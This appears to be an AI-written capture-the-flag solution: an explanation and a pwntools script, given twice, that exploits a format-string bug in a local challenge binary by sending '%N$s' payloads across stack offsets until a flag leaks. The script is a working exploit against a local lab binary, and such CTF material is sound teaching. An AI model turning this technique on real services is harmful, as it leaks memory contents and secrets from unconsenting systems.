("To solve this challenge, we'll use pwntools to exploit a format string "
 'vulnerability in the provided binary. The program reads user input and uses '
 'it directly as a format string in `printf` without proper sanitization, '
 'allowing us to read arbitrary memory addresses. Our goal is to leak the '
 'content of the flag stored in memory by carefully crafting a format string '
 'payload that reads the flag from the stack.\n'
 '\n'
 '**Imports:**\n'
 '\n'
 '```python\n'
 'from pwn import *\n'
 'import string\n'
 '```\n'
 '\n'
 '**Functioning Code:**\n'
 '\n'
 '```python\n'
 'from pwn import *\n'
 'import string\n'
 '\n'
 "# Set the logging level to 'error' to minimize unnecessary output\n"
 "context.log_level = 'error'\n"
 '\n'
 '# Path to the binary\n'
 "binary_path = './pwn/string/fmt-2/fmt2'\n"
 '\n'
 '# Function to find the offset where the flag is located on the stack\n'
 'def find_flag_offset():\n'
 '    for offset in range(1, 40):\n'
 '        # Start the process\n'
 '        p = process(binary_path)\n'
 '        p.recvuntil("what\'s the flag\\n")\n'
 '\n'
 '        # Craft the payload to read the string at the current offset\n'
 "        payload = f'%{offset}$s'\n"
 '        p.sendline(payload)\n'
 '\n'
 '        # Receive the response\n'
 '        response = p.recvuntil("But that was totally wrong lol get '
 'rekt").decode()\n'
 "        output = response.split('You answered:\\n')[1].split('\\nBut that "
 "was totally wrong')[0].strip()\n"
 '\n'
 '        # Check if the output is printable and potentially contains the '
 'flag\n'
 '        if output and all(c in string.printable for c in output):\n'
 "            print(f'Possible flag at offset {offset}: {output}')\n"
 '            # Check if the output resembles a flag (modify this condition '
 'based on flag format)\n'
 '            if "flag" in output.lower() or "{" in output:\n'
 '                p.close()\n'
 '                return offset\n'
 '\n'
 '        p.close()\n'
 '    return None\n'
 '\n'
 '# Find the offset of the flag on the stack\n'
 'flag_offset = find_flag_offset()\n'
 '\n'
 'if flag_offset:\n'
 "    print(f'Flag found at offset: {flag_offset}')\n"
 '\n'
 '    # Start the process again to extract the flag\n'
 '    p = process(binary_path)\n'
 '    p.recvuntil("what\'s the flag\\n")\n'
 '\n'
 '    # Craft the payload to read the flag using the discovered offset\n'
 "    payload = f'%{flag_offset}$s'\n"
 '    p.sendline(payload)\n'
 '\n'
 '    # Receive the response\n'
 '    response = p.recvuntil("But that was totally wrong lol get '
 'rekt").decode()\n'
 "    flag = response.split('You answered:\\n')[1].split('\\nBut that was "
 "totally wrong')[0].strip()\n"
 '\n'
 "    print(f'Flag: {flag}')\n"
 '    p.close()\n'
 'else:\n'
 "    print('Flag offset not found.')\n"
 '```\n'
 '\n'
 '**Explanation:**\n'
 '\n'
 '- **find_flag_offset**: This function iterates over possible stack offsets '
 'to find where the flag is located.\n'
 '    - It sends payloads of the form `%<offset>$s` to the program, which '
 'tells `printf` to treat the data at that stack position as a string and '
 'print it.\n'
 '    - It checks if the output is printable and potentially contains the '
 'flag.\n'
 '    - When it finds an output that resembles a flag, it returns the offset.\n'
 '- **Main Execution**:\n'
 '    - Calls `find_flag_offset` to determine where the flag is on the stack.\n'
 '    - Crafts a payload using the correct offset to extract the flag.\n'
 '    - Starts a new process to avoid any state issues from the previous '
 'runs.\n'
 '    - Sends the payload and prints the extracted flag.\n'
 '\n'
 '**Note**: Ensure that the binary is located at the specified `binary_path`. '
 'Adjust the path if necessary. This code assumes that the flag has a '
 'recognizable format (e.g., contains the word "flag" or curly braces `{}`). '
 'Adjust the conditions in the code based on the actual flag format used in '
 'your challenge.')

from pwn import *
import string

# Set the logging level to 'error' to minimize unnecessary output
context.log_level = 'error'

# Path to the binary
binary_path = './pwn/string/fmt-2/fmt2'

# Function to find the offset where the flag is located on the stack
def find_flag_offset():
    for offset in range(1, 40):
        # Start the process
        p = process(binary_path)
        p.recvuntil("what's the flag\n")

        # Craft the payload to read the string at the current offset
        payload = f'%{offset}$s'
        p.sendline(payload)

        # Receive the response
        response = p.recvuntil("But that was totally wrong lol get rekt").decode()
        output = response.split('You answered:\n')[1].split('\nBut that was totally wrong')[0].strip()

        # Check if the output is printable and potentially contains the flag
        if output and all(c in string.printable for c in output):
            print(f'Possible flag at offset {offset}: {output}')
            # Check if the output resembles a flag (modify this condition based on flag format)
            if "flag" in output.lower() or "{" in output:
                p.close()
                return offset

        p.close()
    return None

# Find the offset of the flag on the stack
flag_offset = find_flag_offset()

if flag_offset:
    print(f'Flag found at offset: {flag_offset}')

    # Start the process again to extract the flag
    p = process(binary_path)
    p.recvuntil("what's the flag\n")

    # Craft the payload to read the flag using the discovered offset
    payload = f'%{flag_offset}$s'
    p.sendline(payload)

    # Receive the response
    response = p.recvuntil("But that was totally wrong lol get rekt").decode()
    flag = response.split('You answered:\n')[1].split('\nBut that was totally wrong')[0].strip()

    print(f'Flag: {flag}')
    p.close()
else:
    print('Flag offset not found.')